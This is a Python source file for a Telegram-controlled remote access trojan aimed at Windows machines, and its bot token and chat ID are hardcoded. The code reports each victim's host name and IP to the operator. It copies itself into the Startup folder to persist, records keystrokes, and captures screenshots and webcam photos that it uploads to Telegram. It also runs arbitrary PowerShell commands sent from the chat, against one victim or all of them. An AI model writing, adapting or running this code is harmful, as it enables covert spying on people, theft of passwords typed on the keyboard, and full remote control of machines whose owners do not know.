import telebot
import telegram
import socket
import pyautogui
import os
import cv2
import requests
import time
import shutil
import winshell
import subprocess
from pynput.keyboard import Listener
from threading import Thread

#Basic bot stuff
TOKEN = '5487264317:AAEKOKCCVjlKYYC1aqlXJRcWGWLOl2ket08'
CHAT_ID = '-833395968'
bot = telebot.TeleBot(TOKEN)
#Ip address
ip = socket.gethostbyname(socket.gethostname())
bot_name = socket.gethostname()
#AppData/Name
Appdata = os.getenv('APPDATA')

#Send Message function 
def send_message(text):
    url_req = "https://api.telegram.org/bot" + TOKEN + "/sendMessage" + "?chat_id=" +  CHAT_ID + "&text=" + text 
    results = requests.get(url_req)

#Join Message
def Join_Message():
        text = bot_name + ": " + ip
        url_req = "https://api.telegram.org/bot" + TOKEN + "/sendMessage" + "?chat_id=" +  CHAT_ID + "&text=" + text 
        results = requests.get(url_req)
Join_Message()

#Backdoor code
def backdoor():
    try:
        #Adding file to startup
        startup = winshell.startup()
        Startup_Path = r"" + startup +"\\app.py"
        #PAth to file for startup
        file = r"app.py"
        shutil.copyfile(file, Startup_Path)
        send_message("Backdoor: " + ip  + " " + "sent Successfully!")
    except:
        send_message("Cannot send backdoor!")

#Keylogger
def keylogger(timer):
    filename = f"Keylogs_{ip}.txt"
    FILE_PATH = f'{Appdata}\Microsoft\Windows\Powershell\{filename}'
    list = []
    def record():

        def on_press(key):
            mod = str(key)
            if mod == "Key.space":
                mod = "'space'"
                list.append(" " + mod + " ")
               
            else:
                new_key = mod[1]  
                list.append(new_key)

        with Listener(on_press=on_press) as ls:
            def time_out(period_sec: int):
                time.sleep(period_sec)
                ls.stop()

            Thread(target=time_out, args=(timer,)).start()
            ls.join()
    record()

    str1 = ''.join(str(e) for e in list)
    file = open(FILE_PATH, "w")
    file.write(str1)   
    file.close()
    bot.send_document(chat_id=CHAT_ID, document=open(FILE_PATH, "rb"))
    os.remove(FILE_PATH)
       
#Screenshot code
def take_screenshot():
    myScreenshot = pyautogui.screenshot()
    PHOTO_PATH = f'{Appdata}\Microsoft\Windows\Powershell\pic.png'
    myScreenshot.save(PHOTO_PATH)
    bot.send_message(chat_id=CHAT_ID, text=f"screenshot: " + ip)
    bot.send_photo(chat_id=CHAT_ID, photo=open(PHOTO_PATH, 'rb'))  
    #Deleting picture
    os.remove(PHOTO_PATH)

#Webcampicture code  
def Webcam_Picture():
    PHOTO_PATH = f'{Appdata}\Microsoft\Windows\Powershell\webcam.jpg'
    cap = cv2.VideoCapture(0)
    x = 0
    while x < 10:
        ret, frame = cap.read()
        if x == 4:
            cv2.imwrite(PHOTO_PATH, frame)
        x += 1
    cap.release()
    cv2.destroyAllWindows()
    #Sending picture
    PHOTO_PATH = f'{Appdata}\Microsoft\Windows\Powershell\webcam.jpg'
    bot = telegram.Bot(token=TOKEN)
    bot.send_message(chat_id=CHAT_ID, text=f"webcam: " + ip)
    bot.send_photo(chat_id=CHAT_ID, photo=open(PHOTO_PATH, 'rb'))
    os.remove(PHOTO_PATH)

#List command
@bot.message_handler(commands=['list'])
def run(message):
    text = bot_name + ": " + ip
    url_req = "https://api.telegram.org/bot" + TOKEN + "/sendMessage" + "?chat_id=" +  CHAT_ID + "&text=" + text 
    results = requests.get(url_req)

#Backdoor command
@bot.message_handler(commands=['backdoor'])
def fun(message):
    #Checking if ip is right
    command_ip = message.text
    command_ip = command_ip.split() 
    if ip in command_ip:
        backdoor()

    pass

#Screenshot command 
@bot.message_handler(commands=['screenshot'])
def run(message):
    #Checking ip
    command_ip = message.text
    command_ip = command_ip.split() 
    if ip in command_ip:
        bot.reply_to(message, "Taking picture...")
        take_screenshot()
    
    if "allbots" in command_ip:
        bot.reply_to(message, "Taking picture...")
        take_screenshot()
    
#Powershell command   
@bot.message_handler(commands=['powershell'])
def run(message):
        def shell():
            command = message.text
            command = command.split()
            command.pop(0) and command.pop(0)

            #Looping the list to string
            command_Str = ' '.join(str(e) for e in command)

            p = subprocess.Popen(
            ['powershell', command_Str], 
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True
            )
            p_out, p_err = p.communicate()
            lines = p_out.splitlines()
            str1 = ' '.join(str(e) for e in lines)
            send_message(str1)
        
        #IP check
        command_ip = message.text
        command_ip = command_ip.split() 
        if ip in command_ip:
            shell()
        if "allbots" in command_ip:
            shell()
  
#Webcam command
@bot.message_handler(commands=['webcam'])
def run(message):

    command_ip = message.text
    command_ip = command_ip.split() 
    if ip in command_ip:
        bot.reply_to(message, "Taking picture...")
        Webcam_Picture()

    if "allbots" in command_ip:
        bot.reply_to(message, "Taking pictures...")
        Webcam_Picture()

#Keylogger command
@bot.message_handler(commands=['keylogger'])
def run(message):
    command_ip = message.text
    command_ip = command_ip.split()
    timer = command_ip[2] + ".0"
    timer = float(timer)
    print(type(timer))

    if ip in command_ip:
        send_message("Recording...")
        keylogger(timer)
    if "allbots" in command_ip:
        send_message("Recording...")
        keylogger(timer)
    
def main():
    bot.polling()
if __name__ == '__main__':
    main()